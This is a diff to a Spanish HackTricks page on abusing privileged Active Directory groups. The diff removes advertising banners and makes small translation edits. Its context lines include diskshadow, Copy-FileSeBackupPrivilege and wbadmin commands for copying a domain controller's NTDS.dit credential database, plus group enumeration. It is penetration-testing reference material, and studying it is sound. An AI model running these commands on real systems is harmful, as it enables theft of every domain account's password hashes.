@@ -2,14 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
-Obtén acceso hoy:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
-## Grupos Bien Conocidos con Privilegios de Administración
+## Grupos bien conocidos con privilegios de administración
 
 - **Administradores**
 - **Administradores de Dominio**
@@ -92,7 +85,7 @@ El acceso directo al sistema de archivos del Controlador de Dominio permite el r
 
 #### Using diskshadow.exe
 
-1. Crear una copia sombra de la unidad `C`:
+1. Create a shadow copy of the `C` drive:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -105,7 +98,7 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Copie `NTDS.dit` de la copia de sombra:
+2. Copia `NTDS.dit` de la copia de sombra:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
@@ -133,7 +126,7 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Para una demostración práctica, consulta [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Para una demostración práctica, consulta [VIDEO DEMOSTRATIVO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
@@ -244,7 +237,7 @@ Para técnicas de explotación relacionadas con **WinRM**, se debe consultar la 
 
 #### Operadores de Servidor
 
-Este grupo tiene permisos para realizar varias configuraciones en Controladores de Dominio, incluyendo privilegios de copia de seguridad y restauración, cambio de hora del sistema y apagado del sistema. Para enumerar los miembros, el comando proporcionado es:
+Este grupo tiene permisos para realizar varias configuraciones en Controladores de Dominio, incluyendo privilegios de respaldo y restauración, cambiar la hora del sistema y apagar el sistema. Para enumerar los miembros, el comando proporcionado es:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
-Obtén acceso hoy:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
